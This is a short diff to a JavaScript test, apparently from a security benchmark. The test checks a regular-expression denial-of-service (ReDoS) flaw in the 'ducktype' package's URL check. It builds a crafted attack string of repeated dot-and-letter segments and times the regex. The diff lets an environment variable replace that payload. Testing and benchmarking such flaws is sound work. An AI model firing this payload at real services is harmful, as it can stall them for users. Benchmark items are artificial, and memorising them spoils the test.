@@ -1,7 +1,7 @@
 test("ReDos in ducktype", () => {
   const measureTime = require("../utils").measureTime;
   const ducktype = require("ducktype");
-  let attack_str = "https://" + ("." + "a".repeat(110)).repeat(7) + "\n";
+  let attack_str = process.env.SECBENCH_PAYLOAD || ("https://") + ("." + "a".repeat(110)).repeat(7) + "\n";
   let t = measureTime(function () {
     console.log(ducktype.url.test(attack_str));
   });
